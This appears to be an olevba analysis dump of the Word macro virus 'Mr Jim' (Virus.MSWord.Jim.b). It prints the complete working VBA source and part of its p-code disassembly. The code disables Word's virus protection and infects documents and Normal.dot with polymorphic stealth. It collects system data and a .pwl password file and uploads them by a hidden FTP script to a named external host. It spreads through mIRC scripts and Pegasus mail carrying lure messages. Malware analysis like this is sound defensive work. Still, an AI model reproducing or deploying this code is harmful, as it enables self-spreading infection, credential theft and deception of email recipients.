olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jim.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jim.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































'  :  ÖÄÄùú :           ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·          : úùÄÄÄ·  :
'  ÈÄ :     ÈÄÄÄÄÄÄÄÄùú : [ Mr Jim/W97Macro Virus   ] : úùÄÄÄÄÄÄÄ¼      : Ä¼
'     ù                 ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½ Started 99/03/XXù
'     ù                              -~BY~-         $$                   ù
'     ù  $$$$$$$$  $$$$$$$$$  $$$$$$$$   $$$$$$$$  $$$$   $$$$$$$$$      ù
'     ú $$$$$ $$$$ $$$$$     $$$$$ $$$$ $$$$$$$$$$  $$   $$$$$$ $$$$     ú
'       $$$$$      $$$$$     $$$$$ $$$$    $$$$          $$$$    $$$$
'        $$$$$$$$  $$$$$$$$$ $$$$$$$$$$    $$$$    $$$$  $$$$
'     ú       $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$    $$$$    ú
'       $$$$$ $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$$$ $$$$
'        $$$$$$$$  $$$$$$$$$ $$$$$         $$$$    $$$$   $$$$$$$$
'                       [Member of Technological Illusions]
'     ù  ** Stealth, Polymorphic, mIRC, Email, Espionaging virus **      ù
'     ù [----------------Some words from our sponsor-------------------] ù
'     ú [ Har du vad som krävs för att bli en international            ] ú
'ÖÄùú : [                      bussiness man?                          ] :úùÄ·
':    ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼   :
'ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·
':    Greetz :                                                               :
'ú  Billy_Bel, Darkman, Techno_Phunc, Urgo32, Vecna, Veedee, Simon7          ú
'ú  Flitnic, Lord_Arz, Virus-X, Owl, T-2000, Griyo, Opic, Serial Killer      ú
'ù  The Lich, LovinGod, Yesnah                                       :
'ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼
'45
Private Sub Document_Open()
'45
'On Error GoTo Host_infiltrated
'45
'It's not my intention to create holocaust, this is just an
'45
'experiment of mine (AI rocks ;)). Follow the instructions for vaccine!
'45
'create c:\_vac.txt for immunity.
'45
Mr_Jim_by_Septic:
'45
generation = 2
'45
check_vac = "c:\_vac.txt"
'45
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo Host_infiltrated
'45
da_normal = Dir(NormalTemplate.FullName)
'45
If da_normal = "" Then GoTo No_normal
'45
SetAttr NormalTemplate.FullName, vbNormal
'45
No_normal:
'45
Application.EnableCancelKey = wdCancelDisabled
'45
Options.VirusProtection = Chr$(48)
'45
Options.SaveNormalPrompt = Chr$(48)
'45
Options.ConfirmConversions = Chr$(48)
'45
Application.ScreenUpdating = Chr$(48)
'45
Application.DisplayStatusBar = Chr$(48)
'45
Application.DisplayAlerts = Chr$(48)
'45
windir = System.PrivateProfileString("c:\msdos.sys", "Paths", "WinDir")
'45
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'45
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'45
If Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then act_inf = 1
'45
If Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then normal_inf = 1
'45
infect_doc:
'45
If act_inf = 1 Then GoTo infect_normal
'45
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'45
Set fix_lines_1 = b
'45
With fix_lines_1
'45
    code_1 = .Lines(1, .CountOfLines)
'45
End With
'45
Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_1
'45
Set polyit = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'45
temp_number = generation + 1
'45
With polyit.CodeModule
'45
    For da_line = 1 To 520 Step 2
'45
    If da_line < 55 Then GoTo stealth_poly
'45
    .replaceline da_line, "'" & Second(Now)
'45
stealth_poly:
'45
     Next da_line
'45
    .replaceline 300, "Sub ToolsMacro()"
'45
    .replaceline 328, "Private Sub Document_Close()"
'45
    .replaceline 56, "Private Sub Document_Open()"
'45
    .replaceline 68, "generation =" & temp_number
'45
 End With
'45
ActiveDocument.Save
'45
infect_normal:
'45
If normal_inf = 1 Then GoTo no_inf
'45
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'45
Set fix_lines_2 = a
'45
With fix_lines_2
'45
    code_2 = .Lines(1, .CountOfLines)
'45
End With
'45
Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_2
'45
Set polyit = Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'45
da_lines = 0
'45
With polyit.CodeModule
'45
    For da_line = 1 To 520 Step 2
'45
    If da_line < 55 Then GoTo stealth_poly_2
'45
    .replaceline da_line, "'" & Second(Now)
'45
stealth_poly_2:
'45
     Next da_line
'45
    .replaceline 300, "Sub ViewVBCode()"
'45
    .replaceline 56, "Private Sub Document_Close()"
'45
    .replaceline 328, "Private Sub Document_Open()"
'45
 End With
'45
NormalTemplate.Save
'45
no_inf:
'45
check_it = Dir("c:\config.dll")
'45
If check_it <> "" Then GoTo Host_infiltrated
'45
collect_i:
'45
user_name = Application.UserName
'45
info_1 = System.Application
'45
info_2 = System.Country
'45
info_3 = System.Creator
'45
info_4 = System.FreeDiskSpace
'45
info_5 = generation
'45
info_6 = System.ProcessorType
'45
info_7 = System.OperatingSystem
'45
With Application.FileSearch
'45
    .FileName = "\*.pwl"
'45
    .LookIn = windir
'45
    .SearchSubFolders = False
'45
    .MatchTextExactly = True
'45
    .FileType = msoFileTypeAllFiles
'45
    .Execute
'45
    passfile = .FoundFiles(Cos(Atn(CInt(1))))
'45
End With
'45
Open "c:\" & user_name & ".dll" For Append As #2
'45
Print #2, passfile
'45
Print #2, "User Name: "; user_name
'45
Print #2, "Time Infected: "; Time
'45
Print #2, "Application : "; info_1
'45
Print #2, "Country code : "; info_2
'45
Print #2, "Creator : "; info_3
'45
Print #2, "Free DiskSpace : "; info_4
'45
Print #2, "Generation of virus : "; info_5
'45
Print #2, "Processor Type : "; info_6
'45
Print #2, "Operating system : "; info_7
'45
Close #2
'45
SetAttr "c:\" & user_name & ".dll", vbHidden
'45
    Open "c:\msdos.dll" For Append As #1
'45
    Print #1, "o ftp.fortunecity.com"
'45
    Print #1, "user mrseptic"
'45
    Print #1, "nofb666"
'45
    Print #1, "binary"
'45
    Print #1, "put ""C:\" & user_name; ".dll"""
'45
    Print #1, "put """ & passfile; """"
'45
    Print #1, "quit"
'45
    Close #1
'45
SetAttr "c:\msdos.dll", vbHidden
'45
Open "c:\config.dll" For Append As #3
'45
Print #3, "BIG as usual in the future"
'45
Close #3
'45
Host_infiltrated:
'45
end_open:
'45
End Sub
'45
Sub ToolsMacro()
'45
On Error GoTo no_doc_stealth
'45
If ActiveDocument = "" Then GoTo no_doc_stealth
'45
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'45
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'45
Act_doc.Saved = True
'45
no_doc_stealth:
'45
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'45
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'45
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'45
Act_norm.Saved = True
'45
Application.ShowVisualBasicEditor = True
'45
End Sub
'45
Private Sub Document_Close()
'45
check_vac = "c:\_vac.txt"
'45
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo the_end
'45
On Error GoTo end_macro
'45
Options.VirusProtection = Chr$(48)
'45
Options.SaveNormalPrompt = Chr$(48)
'45
Options.ConfirmConversions = Chr$(48)
'45
Application.ScreenUpdating = Chr$(48)
'45
Application.DisplayStatusBar = Chr$(48)
'45
Application.DisplayAlerts = Chr$(48)
'45
windir = Environ("WINDIR") & "\"
'45
active_doc = ActiveDocument.FullName
'45
If Dir("c:\mirc32\mirc32.exe") <> "" Then set_dir = "c:\mirc32\": GoTo past_dir
'45
If Dir("c:\program~1\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc32\": GoTo past_dir
'45
If Dir("c:\program\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program\mirc32\": GoTo past_dir
'45
If Dir("c:\mirc\mirc32.exe") <> "" Then set_dir = "c:\mirc\": GoTo past_dir
'45
If Dir("c:\program~1\mirc\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc\": GoTo past_dir
'45
If Dir("c:\program\mirc\mirc32.exe") <> "" Then set_dir = "c:\program\mirc\": GoTo past_dir
'45
GoTo Pegasus
'45
past_dir:
'45
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "warn", "fserve") = "off"
'45
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "warn", "fserve") = "off"
'45
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "warn", "fserve") = "off"
'45
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "warn", "fserve") = "off"
'45
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "warn", "fserve") = "off"
'45
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "ident", "userid") = "MrJim"
'45
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "warn", "fserve") = "off"
'45
On Error GoTo Skip_attr
'45
SetAttr set_dir & "script.ini", vbNormal
'45
Kill set_dir & "script.ini"
'45
Skip_attr:
'45
On Error GoTo end_macro
'45
Open set_dir & "script.ini" For Append As #1
'45
Print #1, "[script]"
'45
Print #1, "n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future"
'45
Print #1, "n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me"
'45
Print #1, "n2=on 1:TEXT:*progråtta*:#:/mode $chan +o $nick"
'45
Print #1, "n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\ config.sys"
'45
Print #1, "n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'45
Print #1, "n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'45
Close #1
'45
Pegasus:
'45
If Dir("c:\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'45
If Dir("c:\mail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'45
If Dir("c:\program~1\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program~1\pmail\": GoTo past_pega_dir
'45
If Dir("c:\program\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program\pmail\": GoTo past_pega_dir
'45
GoTo no_mail
'45
past_pega_dir:
'45
With Application.FileSearch
'45
    .FileName = "\*.pmw"
'45
    .LookIn = pega_dir
'45
    .SearchSubFolders = False
'45
    .MatchTextExactly = True
'45
    .FileType = msoFileTypeAllFiles
'45
    .Execute
'45
    pega_mail = .FoundFiles(Cos(Atn(CInt(1))))
'45
End With
'45
get_rand = Int(Rnd(5) * 5) + 1
'45
user_name = Application.UserName
'45
If get_rand = 1 Then random_message = "Hi! Quite some time has passed since my last mail, I hope you're not too mad at me. I haven't had time to write for several reasons. Anyway there is a quite interesting document attached in this mail, check it out and tell me what you think. Cya / " & user_name
'45
If get_rand = 2 Then random_message = "Hello, yesterday when I was surfing the web a friend told me about this great game. It's called Utopia, have you ever heard of it? It's very cool and I think you would like it, I found this beginners guide on the net, you need it incase you want to succed and become strong. The guide is attached to the message. Bye! / " & user_name
'45
If get_rand = 3 Then random_message = "HHHHhhhEEEeLLooo :) Somedays ago I was chatting on IRC on some warez channels and one guy offered me 3 different ftp sites with cracked versions of Quake III arena, all of them works! In case you doesn't have mIRC installed, install it! It's a very cool chat program. The Ftp's login and password are attached to this message. Ok Cya / " & user_name
'45
If get_rand = 4 Then random_message = "Hiya, I really need your help. This document has to be done for friday and it probably contains a lot of misspellings etc etc. Could you please read it trough and check if you see something? / " & user_name
'45
If get_rand = 5 Then random_message = "Hehehe guess what I found! Tons of XXX passwords and some other cool stuff, it's attached to the message. Have fun ;) / " & user_name
'45
If pega_mail = "" Then GoTo no_mail
'45
Open pega_mail For Input As #2
'45
Line Input #2, mail_line1
'45
Line Input #2, mail_line2
'45
Line Input #2, mail_line3
'45
Line Input #2, mail_line4
'45
Line Input #2, mail_line5
'45
Close #2
'45
file_Ready:
'45
random_1 = Int(Rnd(1) * 10000) + 1
'45
Open pega_dir & "\mail\" & random_1 & ".pmw" For Append As #3
'45
Print #3, mail_line1
'45
Print #3, "SY:0"
'45
Print #3, mail_line3
'45
Print #3, mail_line5
'45
Print #3, "CC:"
'45
Print #3, "EN:0"
'45
Print #3, "CS:0"
'45
Print #3, "RC:0"
'45
Print #3, "DC:0"
'45
Print #3, "UR:0"
'45
Print #3, "SS:0"
'45
Print #3, "SG:0"
'45
Print #3, "MI:1"
'45
Print #3, "ID:<Default>"
'45
Print #3, "EX:0"
'45
Print #3, "AT:" & active_doc; ",Binary,1"
'45
Print #3, "RT: 1"
'3
Print #3, "FL:0"
'3
Print #3, ""
'3
Print #3, random_message
'3
Close #3
'3
no_mail:
'3
For x = 1 To Application.Tasks.Count
'3
If UCase(Application.Tasks(x).Name) = "ADDRESS BOOK" Then da_outlook = Application.Tasks(x).Name: GoTo out_look
'3
If UCase(Application.Tasks(x).Name) = "ICQMSGAPI WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SOCKETS WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SECTION WINDOW" Then GoTo i_connection
'10
If UCase(Application.Tasks(x).Name) = "INTERNET EXPLORER" Then GoTo i_connection
'10
Next x
'10
GoTo end_macro
'10
out_look:
'10
i_connection:
'10
Shell "command.com /c ftp.exe -n -s:c:\msdos.dll", vbHide
'10
end_macro:
'10
If Day(Now) = 2 Then GoTo payload
'10
GoTo the_end
'10
payload:
'10
Selection.TypeText Text:="[Mr Jim/SeptiC/TI] - Do you have what it takes to become an international bussiness man!?"

Selection.TypeParagraph

Selection.TypeParagraph

ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, _
"[Mr Jim]/SeptiC/TI '99" & Chr(13) & "" & Chr(10) & "", "Arial Black", 36#, msoFalse, msoFalse, 121.85 _
, 159.75).Select
   
If ActiveWindow.View.SplitSpecial = wdPaneNone Then
ActiveWindow.ActivePane.View.Type = wdNormalView
Else

ActiveWindow.View.Type = wdNormalView
End If

the_end:

End Sub







































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jim.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 29505 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	QuoteRem 0x0000 0x004C "  :  ÖÄÄùú :           ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·          : úùÄÄÄ·  :"
' Line #32:
' 	QuoteRem 0x0000 0x004B "  ÈÄ :     ÈÄÄÄÄÄÄÄÄùú : [ Mr Jim/W97Macro Virus   ] : úùÄÄÄÄÄÄÄ¼      : Ä¼"
' Line #33:
' 	QuoteRem 0x0000 0x0049 "     ù                 ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½ Started 99/03/XXù"
' Line #34:
' 	QuoteRem 0x0000 0x0049 "     ù                              -~BY~-         $$                   ù"
' Line #35:
' 	QuoteRem 0x0000 0x0049 "     ù  $$$$$$$$  $$$$$$$$$  $$$$$$$$   $$$$$$$$  $$$$   $$$$$$$$$      ù"
' Line #36:
' 	QuoteRem 0x0000 0x0049 "     ú $$$$$ $$$$ $$$$$     $$$$$ $$$$ $$$$$$$$$$  $$   $$$$$$ $$$$     ú"
' Line #37:
' 	QuoteRem 0x0000 0x0044 "       $$$$$      $$$$$     $$$$$ $$$$    $$$$          $$$$    $$$$"
' Line #38:
' 	QuoteRem 0x0000 0x003C "        $$$$$$$$  $$$$$$$$$ $$$$$$$$$$    $$$$    $$$$  $$$$"
' Line #39:
' 	QuoteRem 0x0000 0x0049 "     ú       $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$    $$$$    ú"
' Line #40:
' 	QuoteRem 0x0000 0x0043 "       $$$$$ $$$$ $$$$$     $$$$$         $$$$    $$$$  $$$$$$ $$$$"
' Line #41:
' 	QuoteRem 0x0000 0x0041 "        $$$$$$$$  $$$$$$$$$ $$$$$         $$$$    $$$$   $$$$$$$$"
' Line #42:
' 	QuoteRem 0x0000 0x003A "                       [Member of Technological Illusions]"
' Line #43:
' 	QuoteRem 0x0000 0x0049 "     ù  ** Stealth, Polymorphic, mIRC, Email, Espionaging virus **      ù"
' Line #44:
' 	QuoteRem 0x0000 0x0049 "     ù [----------------Some words from our sponsor-------------------] ù"
' Line #45:
' 	QuoteRem 0x0000 0x0049 "     ú [ Har du vad som krävs för att bli en international            ] ú"
' Line #46:
' 	QuoteRem 0x0000 0x004D "ÖÄùú : [                      bussiness man?                          ] :úùÄ·"
' Line #47:
' 	QuoteRem 0x0000 0x004D ":    ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼   :"
' Line #48:
' 	QuoteRem 0x0000 0x004D "ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
' Line #49:
' 	QuoteRem 0x0000 0x004D ":    Greetz :                                                               :"
' Line #50:
' 	QuoteRem 0x0000 0x004D "ú  Billy_Bel, Darkman, Techno_Phunc, Urgo32, Vecna, Veedee, Simon7          ú"
' Line #51:
' 	QuoteRem 0x0000 0x004D "ú  Flitnic, Lord_Arz, Virus-X, Owl, T-2000, Griyo, Opic, Serial Killer      ú"
' Line #52:
' 	QuoteRem 0x0000 0x0045 "ù  The Lich, LovinGod, Yesnah                                       :"
' Line #53:
' 	QuoteRem 0x0000 0x004D "ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼"
' Line #54:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #55:
' 	FuncDefn (Private Sub Document_Open())
' Line #56:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #57:
' 	QuoteRem 0x0000 0x001E "On Error GoTo Host_infiltrated"
' Line #58:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #59:
' 	QuoteRem 0x0000 0x003A "It's not my intention to create holocaust, this is just an"
' Line #60:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #61:
' 	QuoteRem 0x0000 0x0046 "experiment of mine (AI rocks ;)). Follow the instructions for vaccine!"
' Line #62:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #63:
' 	QuoteRem 0x0000 0x0020 "create c:\_vac.txt for immunity."
' Line #64:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #65:
' 	Label Mr_Jim_by_Septic 
' Line #66:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #67:
' 	LitDI2 0x0002 
' 	St generation 
' Line #68:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #69:
' 	LitStr 0x000B "c:\_vac.txt"
' 	St check_vac 
' Line #70:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #71:
' 	Ld check_vac 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "I guess you have what it takes."
' 	Ld vbInformation 
' 	LitStr 0x0015 "[Mr Jim] By SeptiC/TI"
' 	ArgsCall MsgBox 0x0003 
' 	BoS 0x0000 
' 	GoTo Host_infiltrated 
' 	EndIf 
' Line #72:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #73:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St da_normal 
' Line #74:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #75:
' 	Ld da_normal 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo No_normal 
' 	EndIf 
' Line #76:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #77:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #78:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #79:
' 	Label No_normal 
' Line #80:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #81:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #82:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #83:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #84:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #85:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #86:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #87:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #88:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #89:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #90:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #91:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #92:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #93:
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #94:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #95:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitStr 0x0005 "Paths"
' 	LitStr 0x0006 "WinDir"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St windir 
' Line #96:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #97:
' 	Dim 
' 	VarDefn Act_doc (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Act_doc 
' Line #98:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #99:
' 	Dim 
' 	VarDefn Act_norm (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Act_norm 
' Line #100:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #101:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0168 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St act_inf 
' 	EndIf 
' Line #102:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #103:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0168 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St normal_inf 
' 	EndIf 
' Line #104:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #105:
' 	Label infect_doc 
' Line #106:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #107:
' 	Ld act_inf 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo infect_normal 
' 	EndIf 
' Line #108:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #109:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set a 
' Line #110:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #111:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_norm 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set B 
' Line #112:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #113:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #114:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #115:
' 	SetStmt 
' 	Ld B 
' 	Set fix_lines_1 
' Line #116:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #117:
' 	StartWithExpr 
' 	Ld fix_lines_1 
' 	With 
' Line #118:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #119:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St code_1 
' Line #120:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #121:
' 	EndWith 
' Line #122:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #123:
' 	LitDI2 0x0001 
' 	Ld code_1 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Act_doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
